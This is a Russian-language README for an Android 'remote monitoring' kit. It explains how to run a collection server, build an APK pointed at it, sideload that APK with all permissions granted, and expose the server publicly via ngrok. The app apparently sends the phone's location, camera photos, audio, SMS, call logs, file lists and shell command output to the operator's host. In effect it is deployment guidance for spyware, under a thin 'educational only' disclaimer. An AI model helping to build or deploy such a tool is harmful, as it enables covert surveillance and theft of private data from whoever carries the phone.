# 🖥️ Настройка сервера для приема подключений

## 📋 Быстрый старт

### 1. Запуск HTTP сервера (рекомендуется)

```bash
# Простой HTTP сервер на порту 8080
python3 server/simple_server.py

# На конкретном IP и порту
python3 server/simple_server.py --ip 192.168.1.100 --port 8080

# HTTPS сервер (требует SSL сертификат)
python3 server/simple_server.py --https --cert server.crt --key server.key
```

**После запуска:**
- 🌐 Откройте веб интерфейс: `http://YOUR_IP:8080`
- 📱 Используйте endpoint для Android: `http://YOUR_IP:8080/`

### 2. Запуск Netcat-like сервера

```bash
# Простой TCP сервер для тестирования
python3 server/simple_server.py --mode netcat --port 9999

# Тестирование подключения
nc YOUR_IP 9999
```

---

## 🔧 Сборка APK с правильными настройками

После запуска сервера сразу соберите APK:

```bash
# Пример: сервер запущен на 192.168.1.100:8080
./scripts/build_apk.sh 192.168.1.100 8080 release
```

**Результат:**
- 📦 APK: `builds/RemoteMonitoring-192_168_1_100-8080-release.apk`
- 📄 Info: `builds/RemoteMonitoring-192_168_1_100-8080-release.info`

---

## 📱 Установка на Android устройство

### Через ADB:
```bash
adb install builds/RemoteMonitoring-192_168_1_100-8080-release.apk
```

### Вручную:
1. Скопируйте APK на устройство
2. Включите "Неизвестные источники" в настройках
3. Установите APK
4. Разрешите все запрашиваемые права доступа

---

## 🔍 Мониторинг подключений

### В консоли сервера увидите:
```
============================================================
📱 ДАННЫЕ ОТ ANDROID УСТРОЙСТВА
============================================================
🔗 IP: 192.168.1.45:54321
📱 Device ID: android_abc123
📊 Тип данных: location
⏰ Время: 2024-01-15 15:30:45
📄 Размер данных: 256 байт

📍 ГЕОЛОКАЦИЯ:
   Широта: 55.7558
   Долгота: 37.6176
   Точность: 10 м
   Google Maps: https://maps.google.com/maps?q=55.7558,37.6176
============================================================
```

### В веб интерфейсе:
- Откройте `http://YOUR_IP:8080` в браузере
- Увидите статус сервера и настройки
- API endpoint: `http://YOUR_IP:8080/status`

---

## 🌐 Использование с разных сетей

### Локальная сеть:
```bash
# Узнайте свой IP
ip addr show | grep inet

# Запустите сервер на этом IP
python3 server/simple_server.py --ip 192.168.1.100 --port 8080
```

### Внешний доступ (осторожно!):
```bash
# Сервер доступен извне (только для тестирования!)
python3 server/simple_server.py --ip 0.0.0.0 --port 8080

# Узнайте внешний IP
curl ifconfig.me
```

**⚠️ Внимание:** Не оставляйте сервер открытым в интернете!

---

## 🔐 HTTPS настройка (для продвинутых)

### Создание самоподписанного сертификата:
```bash
# Генерация приватного ключа
openssl genrsa -out server.key 2048

# Создание сертификата
openssl req -new -x509 -key server.key -out server.crt -days 365

# Запуск HTTPS сервера
python3 server/simple_server.py --https --cert server.crt --key server.key
```

**Для Android:** Потребуется добавить сертификат в доверенные или отключить SSL верификацию.

---

## 🧪 Альтернативные методы (для экспериментов)

### 1. Простой netcat:
```bash
# Слушать на порту 8080
nc -l -p 8080

# Android отправит HTTP POST запрос
```

### 2. Python one-liner:
```bash
# Простейший HTTP сервер
python3 -m http.server 8080

# Но не будет обрабатывать POST запросы от Android
```

### 3. Использование ngrok (туннелирование):
```bash
# Установите ngrok
# Запустите локальный сервер
python3 server/simple_server.py --port 8080

# В другом терминале
ngrok http 8080

# Получите публичный URL типа: https://abc123.ngrok.io
# Соберите APK с этим URL (без порта)
./scripts/build_apk.sh abc123.ngrok.io 443 release
```

---

## 📊 Типы данных которые получит сервер

Android приложение будет отправлять JSON в таком формате:

```json
{
  "type": "location",
  "device_id": "android_abc123",
  "timestamp": 1673873445,
  "data": {
    "latitude": 55.7558,
    "longitude": 37.6176,
    "accuracy": 10.0
  }
}
```

### Поддерживаемые типы:
- 📍 `location` - Геолокация (GPS)
- 📸 `camera` - Фотографии (base64)
- 🎤 `audio` - Аудио записи
- 📁 `files` - Список файлов
- 💬 `sms` - SMS сообщения  
- 📞 `calls` - Журнал звонков
- 💻 `shell_command` - Результаты shell команд
- 📱 `system_info` - Системная информация

---

## 🐛 Диагностика проблем

### Android не подключается:
1. **Проверьте IP:** Устройство должно быть в той же сети
2. **Проверьте порт:** Убедитесь что порт открыт
3. **Проверьте firewall:** Отключите firewall для теста
4. **Проверьте APK:** Пересоберите APK с правильным IP

### Тестирование подключения:
```bash
# С компьютера на сервер
curl -X POST http://192.168.1.100:8080/ \
  -H "Content-Type: application/json" \
  -d '{"type":"test","message":"hello"}'

# Должны увидеть в логах сервера
```

### Проверка портов:
```bash
# Проверка что порт открыт
netstat -an | grep 8080

# Сканирование порта с другого устройства
nmap -p 8080 192.168.1.100
```

---

## 🚀 Автоматизация

### Systemd сервис (Linux):
```bash
# Создайте файл /etc/systemd/system/android-monitoring.service
sudo tee /etc/systemd/system/android-monitoring.service << EOF
[Unit]
Description=Android Remote Monitoring Server
After=network.target

[Service]
Type=simple
User=your_user
WorkingDirectory=/home/your_user/remote-monitoring-system
ExecStart=/usr/bin/python3 server/simple_server.py --ip 0.0.0.0 --port 8080
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Запуск сервиса
sudo systemctl enable android-monitoring
sudo systemctl start android-monitoring
```

### Docker контейнер:
```dockerfile
FROM python:3.9-slim

WORKDIR /app
COPY server/ ./
EXPOSE 8080

CMD ["python3", "simple_server.py", "--ip", "0.0.0.0", "--port", "8080"]
```

---

## ⚠️ Важные замечания

1. **Безопасность:** Не используйте в продакшене без аутентификации
2. **Сеть:** Убедитесь что устройства в одной сети
3. **Права:** Android должен иметь все необходимые разрешения
4. **Логирование:** Все данные логируются в консоль
5. **Образование:** Используйте только в образовательных целях!

---

**👨‍💻 Автор:** ReliableSecurity  
**📞 Telegram:** @ReliableSecurity  
**⚖️ Образовательный проект - используйте этично!**